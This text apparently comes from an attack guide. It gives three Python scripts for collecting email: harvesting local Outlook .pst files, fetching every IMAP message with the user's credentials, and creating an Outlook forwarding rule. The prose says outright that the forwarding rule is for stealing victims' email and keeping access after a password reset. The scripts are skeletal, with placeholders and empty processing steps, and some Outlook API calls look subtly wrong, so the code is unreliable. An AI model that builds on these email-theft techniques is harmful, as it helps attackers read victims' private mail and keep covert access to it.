Method 1: Collecting email data from a user's local system\n\nPackages used: os, glob\n\nFunctionality:\n- Identify and acquire Outlook storage or cache files containing email data from a user's local system.\n\n```python\nimport os\nimport glob\n\ndef collect_email_local_system():\n    # Specify the path to the Outlook storage or cache folder\n    email_folder = \"<path_to_email_folder>\"\n    \n    # Check if the folder exists\n    if os.path.exists(email_folder):\n        # Search for email data files (e.g., .pst files) within the folder\n        email_files = glob.glob(os.path.join(email_folder, \"*.pst\"))\n        \n        # Process the email files\n        for email_file in email_files:\n            # Add your code to process or extract data from the email files\n            pass\n    else:\n        print(\"Email folder does not exist.\")\n\n# Call the function to collect email data from a user's local system\ncollect_email_local_system()\n```\n\n2. Method 2: Collecting email data from an Exchange server, Office 365, or Google Workspace\n\nPackages used: imaplib, getpass\n\nFunctionality:\n- Use the user's credentials to interact directly with the Exchange server and acquire information from within a network.\n- Access email using credentials or access tokens for externally facing services.\n- Automate searches for specific keywords using tools like MailSniper.\n\n```python\nimport imaplib\nimport getpass\n\ndef collect_email_remote_system():\n    # Specify the email server details\n    email_server = \"<email_server>\"\n    username = \"<username>\"\n    password = getpass.getpass(\"Enter password:\")\n    \n    try:\n        # Connect to the email server\n        mail = imaplib.IMAP4_SSL(email_server)\n\n        # Authenticate with the server\n        mail.login(username, password)\n\n        # Select the mailbox containing the email\n        mail.select(\"INBOX\")\n\n        # Search for specific emails or keywords\n        status, data = mail.search(None, \"ALL\")\n\n        # Process and extract information from the emails\n        for num in data[0].split():\n            status, email_data = mail.fetch(num, \"(RFC822)\")\n            # Add your code to process or extract data from the email messages\n\n        # Logout from the email server\n        mail.logout()\n        \n    except Exception as e:\n        print(str(e))\n\n# Call the function to collect email data from a remote system\ncollect_email_remote_system()\n```\n\n3. Method 3: Setting up email forwarding rules\n\nPackages used: pywin32 (for Windows), win32com (for Windows), keyring\n\nFunctionality:\n- Abuse email forwarding rules to monitor victim activities and steal information.\n- Create inbox rules using a local email application or web interface.\n- Forward messages internally or externally without restrictions.\n- Maintain persistent access to victim's emails even after compromised credentials are reset.\n\nNote: This method requires access to the victim's email client and may vary depending on the email client being used.\n\n```python\nimport win32com.client\nimport keyring\n\ndef set_email_forwarding_rule():\n    # Specify the email client (e.g., Outlook)\n    email_client = win32com.client.Dispatch(\"Outlook.Application\")\n\n    # Connect to the default email account\n    namespace = email_client.GetNamespace(\"MAPI\")\n    account = namespace.Accounts[0]\n\n    # Retrieve the user's email address and password from keyring\n    email_address = account.SmtpAddress\n    password = keyring.get_password(\"email_forwarding\", email_address)\n\n    if password:\n        try:\n            # Authenticate with the email client\n            email_client.Session.Logon(email_address, password)\n\n            # Create a new rule to forward the emails\n            rule = email_client.Session.DefaultStore.GetRules().Create(\"Forwarding Rule\", 1)\n\n            # Set the rule properties, e.g., forwarding address and conditions\n            # Add your code to customize the rule based on the desired functionality\n\n            # Save and apply the rule\n            email_client.Session.DefaultStore.GetRules().Save()\n            email_client.Session.DefaultStore.GetRules().Apply()\n\n            print(\"Email forwarding rule created successfully.\")\n        \n        except Exception as e:\n            print(str(e))\n    else:\n        print(\"Password not found in the keyring.\")\n\n# Call the function to set up email forwarding rules\nset_email_forwarding_rule()\n```"
